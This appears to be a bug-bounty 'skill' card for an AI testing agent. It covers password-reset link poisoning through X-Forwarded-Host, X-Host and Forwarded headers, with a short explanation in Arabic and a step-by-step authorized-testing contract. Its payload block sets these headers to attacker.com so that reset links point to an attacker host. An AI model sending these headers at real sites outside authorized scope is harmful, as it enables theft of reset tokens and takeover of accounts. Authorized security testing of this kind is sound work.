# SKILL: Password Reset via X-Forwarded-Host / Forwarded headers

**Skill id:** `tip/password-reset-via-x-forwarded-host-forwarded-headers`  
**Category:** Password Reset, Auth Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/402dac31e88081f9976fe0b85eeedd8c  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Password Reset, Auth Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

حتى لو Host محمي، X-Forwarded-Host أو Forwarded بيمر أحيانًا وبيسمم اللينك.

## Payload / Code

```
Host: [legit.com](http://legit.com)
X-Forwarded-Host: [attacker.com](http://attacker.com)
X-Host: [attacker.com](http://attacker.com)
Forwarded: host=[attacker.com](http://attacker.com)
```

## Source

XHack case + 2026 writeups

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
